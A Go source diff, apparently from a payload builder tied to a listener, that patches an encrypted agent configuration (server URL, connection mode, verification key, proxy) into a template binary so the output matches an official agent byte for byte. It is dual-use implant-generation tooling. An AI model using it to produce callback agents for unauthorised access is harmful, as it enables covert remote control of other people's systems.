@@ -199,6 +199,26 @@ func PoBuild(l *Listener, cfg PoConfig) *PoPayload {
 		cfgMap["listen_host"] = cfg.Host
 		cfgMap["listen_port"] = itoa(cfg.Port)
 	}
+
+	// 官方格式的配置区（R13 动态取证）：直接在模板自带的 20480 字节 0x19 占位区
+	// 上原地写入 [16B IV][AES-128-CBC(JSON)]，key == IV == md5(vkey)。
+	// 写成功时产物与官方逐字节一致（见 agentconfig_test.go 的黄金向量）。
+	wireCfg := AgentWireConfig{
+		Server: poServerURL(mode, addr),
+		Type:   mode,
+		Vkey:   verifier,
+		Proxy:  cfg.Proxy,
+		Salt:   salt,
+		L:      true,
+		E:      false,
+		D:      30,
+		H:      10,
+	}
+	if off, perr := PatchAgentConfig(res.Data, wireCfg); perr != nil {
+		Logf("payload: %s has no official config region (%v); official-format config skipped", path, perr)
+	} else {
+		Logf("payload: official config region patched at %#x (20480 bytes)", off)
+	}
 	withCfg, cerr := AppendAgentConfigBlock(res.Data, cfgMap)
 	if cerr != nil {
 		return &PoPayload{Mode: cfg.Mode, Filename: filename, MimeType: mime, Err: cerr}
